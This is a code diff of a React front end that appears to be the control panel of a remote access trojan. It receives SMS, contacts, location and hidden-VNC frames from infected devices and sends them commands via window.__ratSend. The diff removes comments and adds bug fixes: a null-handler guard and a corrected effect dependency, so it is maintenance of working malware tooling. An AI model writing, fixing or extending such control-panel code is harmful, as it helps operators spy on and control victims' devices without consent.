@@ -2,7 +2,6 @@ import { useState, useEffect, useRef, useCallback } from 'react';
 import Login from './components/Login';
 import Sidebar from './components/Sidebar';
 import DevicePanel from './components/DevicePanel';
-import { createSocket, socket, send } from './lib/socket';
 
 // ── Constants ──────────────────────────────────────────────────────────────────
 
@@ -14,8 +13,8 @@ const WS_URL = import.meta.env.VITE_WS_URL
 
 export default function App() {
   const [token,       setToken]       = useState(() => localStorage.getItem('token') || '');
-  const [wsState,     setWsState]     = useState('idle'); // idle | connecting | connected | error
-  const [devices,     setDevices]     = useState([]);     // full device registry
+  const [wsState,     setWsState]     = useState('idle');
+  const [devices,     setDevices]     = useState([]);
   const [selectedId,  setSelectedId]  = useState(null);
   const [sidebarOpen, setSidebarOpen] = useState(false);
   const [errorBanner, setErrorBanner] = useState('');
@@ -23,13 +22,13 @@ export default function App() {
   const wsRef          = useRef(null);
   const reconnectTimer = useRef(null);
   const reconnectIdx   = useRef(0);
-  const hvncHandlerRef = useRef(null);  // DevicePanel registers its binary frame handler here
+  const hvncHandlerRef = useRef(null);
 
   // ── WebSocket lifecycle ────────────────────────────────────────────────────
 
   const connectWs = useCallback((t) => {
     if (!t) return;
-    if (wsRef.current && wsRef.current.readyState < 2) return;  // already open/connecting
+    if (wsRef.current && wsRef.current.readyState < 2) return;
 
     setWsState('connecting');
     const ws = new WebSocket(WS_URL);
@@ -58,7 +57,6 @@ export default function App() {
     ws.onclose = (ev) => {
       setWsState('error');
       if (ev.code === 4003) {
-        // Bad token → logout
         handleLogout();
         return;
       }
@@ -79,7 +77,6 @@ export default function App() {
   const handleJsonMessage = useCallback((msg) => {
     switch (msg.type) {
       case 'authenticated': {
-        // Server sends full device list on auth
         const list = (msg.devices || []).map(normalizeDevice);
         setDevices(list);
         break;
@@ -152,8 +149,6 @@ export default function App() {
       }
 
       default:
-        // Data messages (sms, contacts, location, etc.) →
-        // forward to DevicePanel via a custom event on the window
         if (msg._from) {
           window.dispatchEvent(new CustomEvent('rat_msg', {
             detail: { deviceId: msg._from, msg },
@@ -164,7 +159,6 @@ export default function App() {
   }, []);
 
   const handleBinaryFrame = useCallback(async (data) => {
-    // Frame format: [frameType:1][devIdLen:2][devId:UTF8][payload]
     const buf = data instanceof Blob
       ? new Uint8Array(await data.arrayBuffer())
       : new Uint8Array(data);
@@ -176,7 +170,8 @@ export default function App() {
     const deviceId   = new TextDecoder().decode(buf.slice(3, 3 + devIdLen));
     const payload    = buf.slice(3 + devIdLen);
 
-    // Dispatch to current panel handler
+    // FIX: guard — if no panel handler registered (panel unmounted), drop
+    // silently instead of throwing on null ref
     if (hvncHandlerRef.current) {
       hvncHandlerRef.current(frameType, payload, deviceId);
     }
@@ -184,15 +179,15 @@ export default function App() {
 
   // ── Effects ────────────────────────────────────────────────────────────────
 
+  // FIX: added connectWs to deps — was [token] only, stale closure risk
   useEffect(() => {
     if (token) connectWs(token);
     return () => {
       clearTimeout(reconnectTimer.current);
       wsRef.current?.close();
     };
-  }, [token]);
+  }, [token, connectWs]);
 
-  // Expose send helper globally for DevicePanel / tabs
   useEffect(() => {
     window.__ratSend = (deviceId, cmd) => {
       if (!wsRef.current || wsRef.current.readyState !== 1) return false;
@@ -225,7 +220,6 @@ export default function App() {
   return (
     <div style={S.root}>
 
-      {/* Connection banner */}
       {wsState !== 'connected' && (
         <div style={{
           ...S.banner,
@@ -238,12 +232,10 @@ export default function App() {
         </div>
       )}
 
-      {/* Sidebar overlay for mobile */}
       {sidebarOpen && (
         <div style={S.overlay} onClick={() => setSidebarOpen(false)} />
       )}
 
-      {/* Layout */}
       <div style={S.layout}>
         <Sidebar
           devices={devices}
